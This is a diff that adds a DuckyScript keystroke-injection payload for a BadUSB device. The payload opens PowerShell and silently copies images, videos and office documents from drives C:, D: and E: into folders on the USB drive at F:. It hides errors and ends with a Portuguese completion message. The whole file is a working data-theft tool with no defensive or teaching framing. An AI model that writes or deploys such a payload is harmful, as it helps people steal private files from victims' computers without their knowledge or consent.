@@ -1,0 +1,36 @@
+DELAY 5000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $usbPath = "F:\"
+ENTER
+STRING $srcDrives = "C:\,D:\,E:\"
+ENTER
+STRING $imgExtensions = "*.jpg,*.jpeg,*.png,*.gif,*.bmp,*.tiff"
+ENTER
+STRING $vidExtensions = "*.mp4,*.avi,*.mov,*.mkv,*.wmv,*.flv"
+ENTER
+STRING $docExtensions = "*.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx"
+ENTER
+STRING $imgDest = "$usbPath\imagens\"
+ENTER
+STRING $vidDest = "$usbPath\videos\"
+ENTER
+STRING $docDest = "$usbPath\documentos\"
+ENTER
+STRING New-Item -ItemType Directory -Force -Path $imgDest, $vidDest, $docDest
+ENTER
+DELAY 500
+STRING foreach ($drive in $srcDrives.Split(",")) { foreach ($ext in $imgExtensions.Split(",")) { Copy-Item -Path "$drive\$ext" -Destination $imgDest -Recurse -ErrorAction SilentlyContinue } }
+ENTER
+DELAY 500
+STRING foreach ($drive in $srcDrives.Split(",")) { foreach ($ext in $vidExtensions.Split(",")) { Copy-Item -Path "$drive\$ext" -Destination $vidDest -Recurse -ErrorAction SilentlyContinue } }
+ENTER
+DELAY 500
+STRING foreach ($drive in $srcDrives.Split(",")) { foreach ($ext in $docExtensions.Split(",")) { Copy-Item -Path "$drive\$ext" -Destination $docDest -Recurse -ErrorAction SilentlyContinue } }
+ENTER
+DELAY 500
+STRING echo "Cópia de arquivos de mídia e documentos concluída."
+ENTER
